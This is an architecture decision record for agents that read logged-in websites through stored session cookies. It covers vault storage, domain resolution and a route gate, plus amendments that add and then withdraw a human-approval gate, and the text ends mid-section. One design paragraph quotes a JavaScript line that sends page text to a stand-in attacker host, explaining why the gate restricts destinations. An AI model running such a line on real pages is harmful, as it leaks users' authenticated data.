---
adr: 028
title: "Agent web authentication via cookie sharing"
status: accepted
date: 2026-05-22
axis: knowledge
deciders: [Mike]
consulted: [Ark, CC]
informed: []
depends_on: []
related: [ADR-029]
supersedes: []
---

# ADR-028: Agent Web Authentication via Cookie Sharing

**Authors:** Ark, CC (review)
**Scope:** dpc-client (Rust + Python + UI)
**Amended:** 2026-09-11 — the per-agent domain whitelist (§6), the Tauri WebView popup login
(§1, §3) and the hardcoded eTLD+1 map (§4) are all gone from the code. A recorded human
approval in the vault is the gate now. See the amendment below; the superseded passages are
kept where they are, each marked.
**Amended:** 2026-09-11 (second reading) — two sentences of that amendment have themselves gone
stale: the UI approval channel it calls unfinished is wired, and `browser_state.json` is no
longer a second store of anything. Repaired by a second dated amendment, not by editing the
first.
**Amended:** 2026-09-11 (third) — the approval is withdrawn. The recorded approval, the clean
login window and the per-request headless prompt are all gone from the code; a visible browser
window is the act, and it is not gated. Mike's call. The two amendments above stay as written
and each superseded passage carries a forward pointer; the reversal is the third dated
amendment at the end.

<!-- Status and date moved into the front matter above, 2026-08-10, when --check began
     reading docs/decisions/. This was the one file between 027 and 039 without it. -->


## Context

Agents need READ-only access to authenticated web services on behalf of the user (e.g., example.com order history, example.net account data). Currently, `browser.py` tools (`browse_page`, `fetch_json`) make anonymous HTTP requests with no authentication capability.

Three approaches were considered in backlog AGENT-WEB-AUTH:
- **(A) OAuth2** — correct but many target services (example.com, example.net) lack public OAuth endpoints
- **(B) Cookie Sharing** — user logs in via Tauri WebView popup, cookies stored and reused by agent
- **(C) Browser Automation** — powerful but resource-heavy and fragile

**Decision: (B) Cookie Sharing** as MVP, with abstraction layer for future (A)/(C) pluggability.

### Current State (code-verified)

| Component | Status | Detail |
|-----------|--------|--------|
| `browser.py` | Anonymous only | `requests.get` without cookies; Camoufox fallback triggered by `needs_js` heuristic (`len(text) < 200`) |
| `Cargo.toml` | No cookie extraction | Only `tauri-plugin-opener/dialog/fs/notification` — no WebView cookie API |
| `privacy_rules.json` | Per-tool gating only | `agent_profiles.{id}.tools` = `{tool_name: bool}` — no domain-level granularity |
| Encrypted storage | None | All config files (personal.json, providers.json) are plaintext; RSA keys stored without additional encryption |
| Audit logging | None | `firewall.py` has `logger.debug` for config-load only; no tool-call audit trail |

## Decision

### 1. Authentication Flow

> **Superseded 2026-09-11.** The Tauri WebView popup was deleted in `c2cfab07` (2026-06-05,
> "ADR-029 Task 008 — remove Tauri login popup, add per-request headless auth gate"). The
> login window is now a headed Camoufox window opened by the agent tool `open_login_window`
> (`dpc_agent/tools/browser.py`), and what it produces is not only cookies but an **approval**
> recorded beside them. See the amendment below.
>
> **Amended again 2026-09-11 (third).** The popup is still gone. `open_login_window` is gone
> too, and so is the approval: login is the ordinary visible Camoufox window,
> `browse_page(keep_open=true)`, opened with whatever the vault holds. The diagram's shape
> survives with the second and third boxes merged — the agent opens a window, the person signs
> in there, the cookies are saved by the ordinary writeback, and no approval is recorded.
> *Amendment 2026-09-11 (third)* §2.

```
Agent: "I need access to example.com. Open login window?"
  ↓ user confirms
Tauri command: open_login_window("example.com")
  → Tauri WebView popup (cross-platform — WebView2/WKWebView/WebKitGTK abstracted by Tauri runtime)
  → user logs in manually
  → popup closes → cookies extracted via Tauri native cookies API
  ↓
Cookies stored in encrypted vault per-agent per-domain
  ↓
Agent notified: "authenticated for example.com"
  ↓
Agent: browse_page(url="https://example.com/my/orders", use_auth="example.com")
  → Camoufox launched with planted cookies in profile
  → page content returned to agent
```

### 2. Cookie Storage (Credential Vault)

**Location:** `~/.dpc/agents/{agent_id}/web_credentials.enc` (encrypted blob, not JSON)

**Format:**
```json
{
  "domains": {
    "example.com": {
      "cookies": [
        {"name": "session_id", "value": "...", "domain": ".example.com", "path": "/", "expires": 1748000000, "secure": true, "httponly": true}
      ],
      "authenticated_at": "2026-05-22T17:30:00Z",
      "last_used_at": "2026-05-22T17:35:00Z"
    }
  }
}
```

> **Amended 2026-09-11 — a third field, and the two older ones do not mean what the names
> promise.** A jar now also carries `"approved": {"at", "via"}` (`web_auth.py`). The separation
> is the point: cookies are bytes a browser writes for itself, approval is a decision, and they
> are written by different functions. `authenticated_at` is stamped on **every**
> `web_auth.save_cookies` call, and an ordinary browser close routes through it, so it says
> when the bytes were written and never when a human logged in — board
> `THE-VAULT-STAMPS-A-FRESH-LOGIN-EVERY-TIME-THE-BROWSER-CLOSES`.
>
> **Void since 2026-09-11 (third).** There is no third field. A jar is exactly
> `{cookies, authenticated_at, last_used_at}` again, and `web_auth.save_cookies` says in its
> own docstring why nothing there tries to establish after the fact that a person logged in:
> a jar cannot answer that question, because a site hands guest cookies to any anonymous
> visitor. The sentence about `authenticated_at` still stands and is still the reason it
> could never have been the approval. See *Amendment 2026-09-11 (third)* §4 below.

**Encryption:** Windows DPAPI via `keyring` crate (Rust-side) / `keyring` library (Python-side). Key derived from OS user account, no additional password prompt. Trade-off: same-user attacker can decrypt. Acceptable for Alpha. Master password option deferred to Phase 2.

**Per-agent isolation:** Each agent has separate vault. Even if two agents authenticate on same domain, cookie jars are independent.

### 3. Cookie Extraction (Tauri Rust)

> **Superseded 2026-09-11.** None of this section is live: `web_auth.rs` (192 lines, the whole
> file) and the three `web_auth_*` Tauri commands went in `c2cfab07`. Cookies are read from the
> Playwright context of the Camoufox login window instead
> (`AuthBrowser.capture_login_cookies`). Kept for the record of why a native WebView API looked
> like the cheap path.

**Tauri 2.x provides native cross-platform cookies API** (discovered during T2 spike, S138 2026-05-23). No per-OS WinRT/WKWebView/WebKitGTK bindings needed — Tauri runtime abstracts the underlying WebView per platform.

**API surface** (`tauri::webview::WebviewWindow`, available since Tauri 2.9.5 — our current Cargo.lock pin):

```rust
pub fn cookies(&self) -> Result<Vec<Cookie<'static>>>
pub fn cookies_for_url(&self, url: Url) -> Result<Vec<Cookie<'static>>>
pub fn set_cookie(&self, cookie: Cookie<'_>) -> Result<()>
pub fn delete_cookie(&self, cookie: Cookie<'_>) -> Result<()>
```

`Cookie` type re-exported from `cookie` crate (transitive dep, no addition to `Cargo.toml` needed).

**Estimated ~50-100 lines Rust total** (down from per-platform ~200-300 estimate).

**Implementation pattern:** close-event + spawn-thread. `on_window_event(WindowEvent::CloseRequested)` spawns a separate thread (avoids Windows deadlock on sync handlers) that calls `cookies_for_url()` and emits the `web_auth_login_complete` Tauri event. Frontend forwards via existing WebSocket to Python vault (T3).

**Tauri command signatures** (already scaffolded at `dpc-client/ui/src-tauri/src/web_auth.rs`):

```rust
#[tauri::command]
pub async fn web_auth_open_login_window(domain: String) -> Result<Vec<Cookie>, String>;

#[tauri::command]
pub async fn web_auth_get_status(domain: String) -> Result<AuthStatus, String>;

#[tauri::command]
pub async fn web_auth_revoke(domain: String) -> Result<(), String>;
```

### 4. eTLD+1 Cookie Resolution

Cookies are stored and matched by **eTLD+1** (effective Top-Level Domain plus one), not exact domain.

- `login.example.com` → eTLD+1 = `example.com`
- `www.example.com` → eTLD+1 = `example.com`
- `api.example.com` → eTLD+1 = `example.com`

For MVP: hardcoded eTLD+1 map for supported domains. For Phase 2: Mozilla Public Suffix List integration.

All cookies for eTLD+1 and its subdomains are included in authenticated requests.

> **Done 2026-09-11, and the MVP shortcut was worse than "hardcoded".** The map was twelve
> entries with **passthrough**: every host it did not know came back unchanged, so
> `use_auth="com"` resolved to `com` and made every `.com` site one jar — board
> `RESOLVE-ETLD1-IS-THE-IDENTITY-FUNCTION-FOR-EVERY-REAL-DOMAIN`. `web_auth.resolve_etld1` is
> now a real Public Suffix List resolver over a vendored list
> (`dpc-client/core/dpc_client_core/data/public_suffix_list.dat`, 334 129 bytes, new and
> untracked as of 2026-09-11) and returns **`None`** — never the input — for anything that is
> not a registrable domain: a bare public suffix, a single label, an IP literal, an
> unparseable string. `web_auth.save_cookies` raises on such a value rather than keying a jar
> with it.

### 5. Camoufox as Primary Transport for Auth

**Critical design decision:** When `use_auth=domain` is specified, requests ALWAYS go through Camoufox, never through plain `requests.get`.

**Rationale (code-verified):** Current Camoufox fallback in `browser.py` triggers on `len(text) < 200` heuristic. Auth challenge responses from example.com/example.net often exceed 200 chars ("please log in" pages), so the heuristic will NOT trigger Camoufox. Even with correct cookies, plain HTTP will fail due to:
- TLS fingerprinting
- JavaScript challenges
- Browser behavior checks

**Routing logic:**
```
if use_auth specified AND cookie vault has non-expired cookies for domain:
    → Camoufox with planted cookies in profile
elif use_auth specified BUT no/empty cookies:
    → Error: "re-login required for {domain}"
else:
    → existing browse_page logic (HTTP → Camoufox fallback)
```

**Cookie planting in Camoufox:** Export cookies from vault → write to Camoufox profile's `cookies.sqlite` → launch browser → extract content.

### 6. Firewall Extension: Domain-Level Gating

> **Void since 2026-09-10 — this whole section describes a mechanism that no longer exists.**
> `agent_profiles.<id>.web_auth.allowed_domains` is not read, not written and not present in
> any profile; `ContextFirewall.get_agent_web_auth_domains` is deleted (the uncommitted
> working-tree diff of `firewall.py` removes it), and `_BACKEND_OWNED_PROFILE_KEYS` in
> `service.py` — which existed to keep the editor from overwriting that key — is now
> `frozenset()`, with the reason written above it. What replaced it is in the amendment below.
> Kept in place because the whitelist's failure is the argument for what came after it.

**Current schema** (`privacy_rules.json`):
```json
"agent_profiles": {
  "agent_001": {
    "tools": {"browse_page": true, ...},
    "sandbox_extensions": [...]
  }
}
```

**New block** (per-agent, alongside existing `tools` and `sandbox_extensions`):
```json
"agent_profiles": {
  "agent_001": {
    "tools": {"browse_page": true, ...},
    "sandbox_extensions": [...],
    "web_auth": {
      "allowed_domains": ["example.com", "example.org"],
      "permissions": "read_only"
    }
  }
}
```

~~**Enforcement:** `use_auth=domain` parameter in `browse_page`/`fetch_json` is validated against `web_auth.allowed_domains` for the calling agent. If domain not in whitelist → tool call rejected with "domain not authorized".~~

> **Replaced 2026-09-11.** `use_auth` is validated against the vault instead: it is resolved to
> a registrable domain, and the call is refused unless `web_auth.is_approved(agent_id, etld1)`
> finds a recorded approval — audit status `auth_denied:no_approved_login`, or
> `auth_denied:not_a_domain` when the value names no registrable domain (`browse_page` in
> `dpc_agent/tools/browser.py`). `fetch_json` still has no `use_auth` parameter; the code says
> so at that gate, and says that if it ever gains one the check is to be hoisted into a shared
> helper rather than copied.
>
> **Void since 2026-09-11 (third).** `is_approved` does not exist, and the token
> `auth_denied:no_approved_login` appears nowhere in the tree. What `browse_page` checks now
> is `resolve_etld1` (unchanged, still refusing with `auth_denied:not_a_domain`) and, on the
> **headless path only**, `web_auth.has_session` — refused with `auth_denied:no_session`.
> That second check is about capability, not permission: it refuses a background fetch that
> would download a login page into a window nobody can see. The note about `fetch_json` still
> holds. See *Amendment 2026-09-11 (third)* §§2 and 4 below.

**`permissions: "read_only"`** is the only value for MVP. WRITE permission is explicitly out of scope. Agent tools cannot perform POST/PUT/DELETE with auth cookies.

### 7. Audit Trail

**New file:** `~/.dpc/agents/{agent_id}/web_audit.jsonl`

**Format:**
```jsonl
{"timestamp": "2026-05-22T17:42:00Z", "agent_id": "agent_001", "domain": "example.com", "url": "https://example.com/my/orders", "method": "GET", "status": 200, "bytes": 45230}
```

**Properties:**
- Append-only, no rotation in MVP
- Not tied to knowledge commit chain — separate audit stream
- Agent cannot write to this file directly (tool-level restriction)
- Readable by user via future UI panel (Phase 2)

### 8. Cookie Replacement Semantic

On re-authentication (user opens login popup again for same domain): **REPLACE** entire cookie jar for eTLD+1.

**Rationale:** Old session is expired. Merging risks leaving stale cookies that confuse server-side session logic. Clean replacement is simpler and safer.

### 9. Expiry Handling

When cookies are expired (checked against `expires` timestamp):
- Tool call returns error: "Cookies for example.com expired. Ask user to re-login."
- Agent notifies user: "My access to example.com has expired. Open login window again?"
- No auto-popup — user must explicitly trigger re-auth (transparent, no surprise)

## Implementation Phases

### Phase 1 (MVP)
1. ~~Rust: `open_login_window` Tauri command (cross-platform via Tauri native cookies API, since 2.9.5)~~ — **deleted in `c2cfab07`** (`web_auth.rs`, 192 lines, whole file); the name survived for one day as a **Python agent tool** with a different body, not a Tauri command, and was deleted in turn on 2026-09-11 (*Amendment (third)* §4). No tool called `open_login_window` exists
2. Rust: DPAPI-encrypted credential vault read/write
3. Python: `web_auth.py` module — vault access, cookie resolution, eTLD+1 matching
4. Python: `browser.py` extension — `use_auth` parameter, Camoufox-with-cookies routing
5. ~~Python: firewall validation — `web_auth.allowed_domains` check~~ — **removed 2026-09-10**, replaced by the vault-approval check (§6 note above)
6. Python: `web_audit.jsonl` append on every auth request
7. ~~UI: "Login" button in chat (agent-initiated, user-approved)~~ — **removed in `c2cfab07`** together with the Web Authentication section of the permissions panel; the agent tool `open_login_window` is the entry point now
8. ~~`privacy_rules.json`: `web_auth` block for agent_001~~ — **removed 2026-09-10**; no profile carries a `web_auth` block

### Phase 2 (Future)
- Master password encryption option
- Audit trail UI panel
- OAuth2 driver for services that support it
- ~~Public Suffix List for eTLD+1 resolution~~ — **done 2026-09-11**, see the §4 note
- Cookie health monitoring (expiry warnings)

### Phase 3 (Future)
- Browser automation driver (Selenium/Playwright via Camoufox)
- WRITE permissions with per-action user confirmation
- Multi-session support (multiple accounts per domain)

## Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Tauri cookies API flagged unstable in upstream docs | Low | Currently on Tauri 2.9.5 (API present since this version); monitor 2.10+ changelog; pin to `"2.9"` if breaking change appears |
| Windows sync deadlock on `cookies()` call | Low | All Tauri commands use `async fn` and close-event handler spawns a separate thread before calling `cookies_for_url()` — pattern documented in T2 impl |
| Anti-bot evolution may break Camoufox+cookies approach | Medium | Cookie replant + Camoufox profile reset; fallback to re-login |
| DPAPI same-user attacker can decrypt vault | Low (Alpha) | Acceptable for Alpha; master password option in Phase 2 |
| eTLD+1 edge cases (co.uk, etc.) | Low — **realised, 2026-08/09** | Hardcoded MVP domains; PSL integration Phase 2. The severity was wrong: the map's *passthrough* made every unknown host its own jar and `com` a jar for all of `.com`. Closed 2026-09-11 by the vendored PSL (§4 note) |
| example.com/example.net DOM changes break content extraction | Medium | Agent-side resilience; user can re-trigger extraction |

## Consequences

**Positive:**
- Agents can access real user data (orders, deliveries, feeds)
- Per-agent isolation preserves multi-agent security model
- Audit trail provides after-the-fact visibility
- Foundation for future OAuth2 / browser automation drivers

**Negative:**
- Full session access (not granular per-page) — READ-only scope mitigates
- Platform-specific Rust code increases maintenance surface
- Cookie expiry creates UX friction (re-login prompts)
- First encrypted storage in the system — sets precedent for future secrets

## Amendment 2026-09-11 — the whitelist is gone; a recorded approval is the gate

**Decided by Mike, 2026-09-11**, in the team chat, on a reviewer's point that §6 and the
Phase 1 list still prescribe a mechanism deleted from the code — so "the next person who opens
the ADR reads a cancelled world". Board entry:
`THE-DECISION-RECORD-STILL-SPECIFIES-THE-WEB-AUTH-GATE-THAT-WAS-DELETED`.

The body above is kept as written and each void passage carries a pointer here, following
ADR-032's amendment of 2026-09-07: a decision that was reversed should show both states rather
than only the last one. The discarded option is the argument for what replaced it, so deleting
it would cost this file the one thing it exists for.

Everything below was read in the working tree of 2026-09-11. The `firewall.py`, `service.py`,
`browser.py` and `web_auth.py` changes are **uncommitted**, and a parallel task was editing
`browser.py` and `web_auth.py` while this was written — `browser.py` grew by several hundred
lines between the first and second reading. Code is therefore cited **by symbol, not by line**:
a line number taken that afternoon was already wrong by the evening. `c2cfab07` (2026-06-05) is
on `dev`.

### 1. What authorises an authenticated fetch now

Three checks, in this order, all inside `browse_page` (`dpc_agent/tools/browser.py`):

1. **The value must name a registrable domain.** `web_auth.resolve_etld1(use_auth)` returns
   `None` rather than the input for a public suffix, a bare label, an IP literal or an
   unparseable string; the call is refused with audit status `auth_denied:not_a_domain`.
2. **The vault must hold a recorded human approval for that domain** —
   `web_auth.is_approved(agent_id, etld1)`, refused with `auth_denied:no_approved_login` and a
   message naming which domains *are* approved. **Cookies alone are not authorisation**: the
   ordinary navigate/close writeback creates and refreshes a jar, so a jar proves the agent has
   been somewhere, not that anyone agreed to it.
3. **Headless additionally asks a person, per request** — the ADR-029 Task 008 gate, unchanged,
   with audit statuses `headless_approved` / `headless_rejected` / `headless_no_ui`.

Check 2 is new and is the replacement for §6. It applies to **headed and headless alike**; only
check 3 distinguishes them. The code states why at that gate: `keep_open=True` spends a stored
login exactly as headless does, and a window being visible does not make the account's owner the
one who chose to spend it.

The audit token `auth_denied:no_approved_login` is the one a reader should grep for. It replaces
the "domain not authorized" of §6 and an intermediate `auth_denied:no_vault_jar` that existed
for part of 2026-09-11 and is already gone — the board entry that opened this amendment still
names that intermediate token.

> **Void since 2026-09-11 (third), except check 1.** Check 2 is withdrawn with the whole
> approval mechanism. Check 3 is withdrawn too, and that is the part a reader comparing the
> amendments would otherwise miss: the per-request headless prompt is **not** "unchanged" any
> more, its three audit statuses are gone from the tree, and the two commands that carried the
> answer are deleted. Check 1 stands exactly as written. *Amendment 2026-09-11 (third)* §§4
> and 5 below.

### 2. Logging in and spending a login are two different operations

A new agent tool `open_login_window(domain, timeout_sec)` opens a **headed** Camoufox window
with a clean profile — no `storage_state`, no vault cookies, and a route gate scoped to the one
site (`AuthBrowser._start_clean` is true for a login window, an anonymous session, or a session
with no scope at all). The human types the password there; `AuthBrowser.capture_login_cookies`
polls the live context and ~~writes what appears~~ *(**amended 2026-09-11 (second reading)**: holds
what appears in memory — `commit_login_cookies` is the only writer, and it runs only after the
person answers yes)*, because the human closing the window is exactly the case where `close()`
finds the context already dead.

It is registered with `default_enabled=False` (its `ToolEntry` in `browser.py`), per the S148
rule in CLAUDE.md: it puts a password prompt on the user's screen and is the one act that can
create an approval.

**Writing cookies and recording the approval are two functions, deliberately.**
`web_auth.save_cookies` writes bytes; `web_auth.record_approval` writes a human's yes onto an
existing jar and **takes no cookie argument at all** — its docstring gives the reason: "an
approval that arrives together with a cookie snapshot is one a browser can mint by loading a
page". `AuthBrowser._sync_cookies_to_vault` calls `save_cookies` without `approved_via`, so no
path that writes cookie bytes can create an approval. See §5: this split is the repair of a
defect found on the first live run, and at the time of writing `record_approval` had no caller
in the tree.

> **Amended 2026-09-11 (second reading).** The split holds, but the function that writes an
> approval is not `record_approval` — the yes and the cookies go down together through
> `commit_login_cookies` → `save_cookies(approved_via=…)`, reached only after the person
> answers. What guards the rule is that the *ordinary* writeback still passes no `approved_via`.
> See the second amendment below, §2.
>
> **Void since 2026-09-11 (third).** `open_login_window` is gone as a tool and as a function,
> together with `capture_login_cookies`, `commit_login_cookies`, `record_approval` and the
> `approved_via` argument. Login is back where ADR-029 put it in the first place: the ordinary
> visible window, `browse_page(keep_open=true)`, opened with whatever the vault holds. The
> split this section argues for was the right repair of a wrong premise; the premise was that
> a cookie could be made to prove a person acted. *Amendment 2026-09-11 (third)* §§1 and 2
> below.

### 3. The route gate now constrains the destination, not only the initiator

The eTLD+1 allowlist alone renders real sites blank, because a site's own bundle lives on hosts
it never names (`x.com` boots from `abs.twimg.com`). In `AuthBrowser._domain_route_gate`, a
**GET/HEAD subresource** — never a navigation — passes when both ends are constrained: the
initiating frame is inside the allowlist **and** the host being contacted is one this site's
manifest names. Constraining only the initiator would leave
`new Image().src = "https://evil.tld/?d=" + document.body.innerText` carrying data out in a URL,
and `<script src>` running foreign code inside the authenticated origin; the reason is written
at that gate.

The manifest is `~/.dpc/web_cdn_manifest.json` — **node level, deliberately outside every
agent's sandbox** — merged with a small in-code seed (`web_auth.CDN_MANIFEST_SEED`, exact hosts
only, never suffixes: `*.twimg.com` would reopen by pattern what the allowlist closes by name).
Refused hosts are folded into `web_cdn_refusals.json` per agent by
`web_auth.record_cdn_refusals`, read by the UI that asks the human and by nothing on the
request path. **A refusal authorises nothing**; promotion into the manifest is a separate
act (`web_auth.promote_cdn_refusals`). This is the same shape as the vault split above: the
thing an agent can write is never the thing that grants.

The file was called `web_cdn_observed.json` until 2026-09-11, when the word went back to meaning
only the backlog's observation shelf ([GLOSSARY.md](../GLOSSARY.md)). `web_auth` reads the old
name when the new one is absent or unreadable and folds it into the new file on the next write,
so a record a human was meant to promote from survives the rename; the old file is never deleted.

> **Narrowed 2026-09-11 (third).** Every mechanism in this section is intact and none of it
> was reversed, but it now governs the **headless path only**: `_domain_route_gate` continues
> every request for a headed session before it reaches either the allowlist or the manifest.
> A visible window therefore produces no CDN refusals at all. *Amendment 2026-09-11 (third)*
> §§2 and 3 below.

### 4. Why the whitelist could not be the gate

`web_auth.save_cookies` stamps `authenticated_at` on every call and every ordinary browser close
routes through it, so the field that was read as "when a human last logged in" was being written
by the agent's own traffic. Measured and recorded on the board
(`THE-VAULT-STAMPS-A-FRESH-LOGIN-EVERY-TIME-THE-BROWSER-CLOSES`, 2026-09-11): agent_001's
`x.com` jar read `authenticated_at 2026-09-10T17:49:02Z`, and the audit row at exactly that
second is `close | x.com | ok` — an ordinary close, not a login. *That measurement is reported
from the board, not re-run here; the unconditional stamp itself was read in the code.*

That is why the `approved` block exists as a separate field rather than as a reading of the
cookies: **cookies are data a browser writes for itself; approval is a decision.** The
whitelist, a third list that could only ever narrow what the other two already permitted, was
removed in the same change.

**One honesty note belongs here, because the board carries it and this document should not
read as a clean story:** the argument for deleting the whitelist rested on a premise that was
plausible, load-bearing and unmeasured, and the reviewer who supplied it retracted it the same
evening — board `NOTHING-ASKS-WHICH-PREMISE-UNDER-A-DECISION-CARRIES-A-MEASUREMENT`. The
mechanism above is what the code does today; whether the deletion was justified at the moment it
was made is that entry's question, not this section's answer.

### 5. What this amendment does **not** claim to have settled

- **The clean-profile premise was false, and the repair is in flight.** `open_login_window`'s
  docstring stated it: "the only way cookies for `domain` can appear in it is that the human
  typed the password — their appearance IS the approval". On the first live run, 2026-09-11, a
  site that hands any visitor anonymous cookies on first contact (`guest_id`, `gt`, `__cf_bm`)
  minted an approval 24 seconds in, on a logged-out page — *reported from that run, not
  reproduced here*. The premise is now disowned in the code itself: `record_approval` "takes no
  cookie argument on purpose", and the login window's own summary says a jar of guest cookies
  and a jar carrying a real session "both take the same route to the same question, and only the
  answer grants". Approval is being moved to an explicit human answer over the existing UI
  approval channel. ~~**At the last reading, `record_approval` had no caller: the receiving half
  of that channel was not yet wired. Not finished — do not read this section as done.**~~
  > **Amended 2026-09-11 (second reading).** The move landed: the login window asks through
  > `_ask_human_to_approve` and writes nothing on any answer but yes, and the reply comes back
  > over `web_auth_approve_headless` / `web_auth_reject_headless`. The channel is finished; the
  > function named here is not the one that writes. Second amendment below, §2.
  > **Void since 2026-09-11 (third).** The channel that was finished has been removed, dialog
  > and commands and all. The clean-profile premise this bullet disowned was replaced by a
  > human answer, and the human answer failed in its turn on 2026-09-11 at 09:43 — the window
  > timed out on a two-factor screen, the person answered yes about a sign-in they had begun,
  > and the approval landed on a jar with no session in it, replacing one that worked.
  > *Amendment 2026-09-11 (third)* §1, steps 5 to 7.
- ~~**`browser_state.json` is a second store of logins that no approval governs.** It holds the
  cookies of every site the session's scope covered, is rewritten after every navigate and at
  close, and is plaintext — `chmod 0600` runs under `if os.name == "posix"` only, so on Windows
  it inherits the directory ACL. Nothing in it carries an `approved` field, and the vault gate
  does not read it. Two things verified in the 2026-09-11 tree narrow the board's description:
  a session with no scope now starts clean and carries no identity, and `_save_storage_state`
  refuses to write for an anonymous or unscoped session.~~ The other half of board entry
  `A-HEADED-SESSION-OPENED-WITHOUT-USE-AUTH-INSTALLS-NO-ROUTE-GATE-AND-STILL-LOADS-EVERY-COOKIE`
  — session reuse deciding reuse without comparing the domain argument — was **not** checked
  here. The two-store question is older than today:
  `LIST-AUTH-DOMAINS-REPORTS-ON-A-STORE-THAT-NO-LONGER-RECEIVES-LOGINS` and
  `KEYS-AND-API-TOKENS-LIE-IN-PLAINTEXT-WITH-DEFAULT-PERMISSIONS`.
  > **Void since 2026-09-11 (second reading).** The struck sentences describe a file that is now
  > neither read nor written, and a function, `_save_storage_state`, that no longer exists.
  > There is no second store: a session's identity is the vault jar for its own scope and
  > nothing else. Kept as written because it is the description the repair was made against.
  > Second amendment below, §1. The unstruck sentences still stand — the session-reuse half was
  > not checked then and is not checked now.
- **The suite that guards all of this was falsified and leaked** — board
  `THE-NEW-WEB-AUTH-TESTS-SURVIVE-THE-DELETION-OF-WHAT-THEY-ARE-NAMED-FOR`: four deliberate
  breakages out of fourteen left the suite green. Nothing in this amendment should be read as
  "verified by tests".

### 6. Unchanged by this amendment

§2's location and encryption (`~/.dpc/agents/{agent_id}/web_credentials.enc`, Fernet with the
key in keyring — §2 above says "DPAPI", which is what `keyring` uses as its Windows backend, not
what the file format is), §7's audit trail (`web_audit.jsonl`, now with rotation), §8's
replace-the-whole-jar semantic, and the READ-only scope.

---

## Amendment 2026-09-11 (second reading) — the channel is wired, and the second store is not a store

The amendment above is left exactly as written: an amendment edited in place stops being a record
of what was believed when it was made. This one records the two of its sentences that the same
day's code has since made false — one of them in the direction that understates what was built.

The same caution applies, more sharply: `browser.py` and `web_auth.py` were **being edited by a
parallel task while this was written**, so code is cited **by symbol, not by line**, and §2 says
which half of its claim is settled and which was moving under it. The reading was taken after
`974309a9`.

### 1. `browser_state.json` is neither read nor written

§5's second bullet describes it as a plaintext store of every scope's cookies, rewritten after
every navigate and at close. Nothing writes it and nothing reads it:

- `AuthBrowser._open` passes no `storage_state` when it creates the context, for any session.
- A session's identity is `_inject_vault_cookies` — the vault jar for the scope it was opened
  with. A clean-start session gets nothing.
- The close-time writeback is `_persist_session_cookies`, whose whole effect is
  `_sync_cookies_to_vault`: in-scope cookies into the encrypted vault. Its docstring says the
  rest in its own words — the file "is neither read nor written any more".
- `_save_storage_state`, named in that bullet, no longer exists.

A `browser_state.json` left over from before the change sits there inert. Deleting it is
housekeeping; nothing depends on it either way. What is *not* closed by this reading is the other
half of the board entry that bullet cites — session reuse deciding reuse without comparing the
domain argument — nor `LIST-AUTH-DOMAINS-REPORTS-ON-A-STORE-THAT-NO-LONGER-RECEIVES-LOGINS`.

### 2. The approval channel is wired; which function writes is a smaller question

§5's first bullet says approval "is being moved" to an explicit human answer, that
`record_approval` had no caller, and "Not finished". The move has landed:

- `open_login_window` puts the question through `_ask_human_to_approve` with
  `kind=APPROVAL_KIND_LOGIN` and writes to the vault on no other answer than yes.
- The answer returns over the channel that already existed for the headless gate:
  `web_auth_approve_headless` / `web_auth_reject_headless` in `service.py`, both on the
  `local_api.py` command allowlist, sent by `WebAuthApprovalDialog.svelte`.

§2 above says "writing cookies and recording the approval are two functions, deliberately", and
names `record_approval` as the second. The **rule** holds — the ordinary writeback passes no
`approved_via`, so no path that writes cookie bytes can mint an approval. The **function** does
not: the login window's yes writes both at once through `commit_login_cookies` →
`save_cookies(approved_via=…)`, and at this reading `record_approval` again had no production
caller. It had one at `974309a9`; the parallel task's uncommitted edit replaced that call with a
read. Which function performs the write was moving while this was written. That a human answer,
and only a human answer, is what grants is the part that is settled and the part worth reading.

> **Void since 2026-09-11 (third).** Nothing grants any more, so the question of which function
> writes the grant has lost its subject. `web_auth_approve_headless` and
> `web_auth_reject_headless` are deleted from `service.py` and from the `local_api.py`
> allowlist; `WebAuthApprovalDialog.svelte` and `services/webAuthApproval.ts` are deleted from
> the UI. *Amendment 2026-09-11 (third)* §4.

### 3. Not checked here

The suite caveat in §5's third bullet is unchanged: nothing in either amendment should be read as
"verified by tests". Neither reading exercised a live login.

---

## Amendment 2026-09-11 (third) — the approval is withdrawn; the visible window is the act

**Mike's call, 2026-09-11.** The two amendments above record a gate built, repaired and
rebuilt across two days. This one records its removal and the return to the model ADR-029
accepted on 2026-05-24: the agent opens a browser window, the person is at it, and what they
do there is the act. Both earlier amendments stay exactly as written and each superseded
passage carries a forward pointer — three reversals in two days is precisely the history these
records exist to keep, and an amendment edited in place stops being a record of what was
believed when.

The same citation caution as before, and for the same reason: the code was read in the
**uncommitted** working tree of 2026-09-11, minutes after it landed, and is cited **by symbol,
not by line**. Line numbers taken in this file today have been wrong within the hour.

### 1. How the design got here, in order

Each step was reasonable against the one before it. That is why the end state had to be
reached before it could be judged, and why the arc belongs in the record rather than only its
last frame.

1. **A real defect, and the repair stands.** `browser_state.json` in the agent's sandbox had
   accumulated 230 cookies across 55 domains, a live session token among them, put there by
   nobody's decision. One identity store — the vault — was the correct answer and is **not**
   reversed here. It is what *Amendment (second reading)* §1 records. *Reported from that
   reading.*
2. With the vault the only store, the question became what puts things into it. "A human
   login" was the right answer. The project then went one step further and tried to **prove**
   that a human had acted.
3. To make that proof possible, login moved into a **separate window with a clean profile**,
   so that "a cookie appeared" could mean "a person acted" (*Amendment* §2).
4. **A live run falsified it.** The site hands guest cookies to any anonymous visitor, so the
   clean window proved nothing (*Amendment* §5, first bullet). *Reported from that run.*
5. A question went to the person instead — "did you finish signing in?" — and an `approved`
   block in the vault became the condition of access, `browse_page(use_auth=…)` refusing
   without it even with a person at the screen (*Amendment (second reading)* §2).
6. **That failed too**, 2026-09-11 at 09:43. The window's budget expired while the person was
   on the two-factor code screen. They answered yes, honestly, about a sign-in they had begun;
   an approval was recorded over a jar holding no session, and it **replaced a working one**.
   The audit reads `closed_by: "timeout"`, url
   `x.com/i/jf/onboarding/web#/s/two_factor_code/…`, `baseline_cookies 7 → 9`, new names
   `cf_clearance` and `g_state`. *Reported from that run, not reproduced here.*
7. **The repair everyone had agreed on died on a measurement.** The identity heuristic —
   `httponly` plus a value of eight characters or more — counted Cloudflare's `cf_clearance`
   (426 characters) and `__cf_bm` as identity, so the worthless jar scored two marks. The
   signal was not weak, it was wrong, and it is wrong on any site behind that CDN. *Reported
   from that measurement, not re-run here.*

What the sequence settles is not whether each step was sound but what the gate was worth. A
silent, wrong gate is worse than no gate: it refused a person who was at the keyboard and
admitted a jar with nothing in it. The site's own login form is the alternative, and it is
loud and self-correcting — a person who did not sign in meets it immediately.

### 2. The model that replaces it

```
agent goes to a site
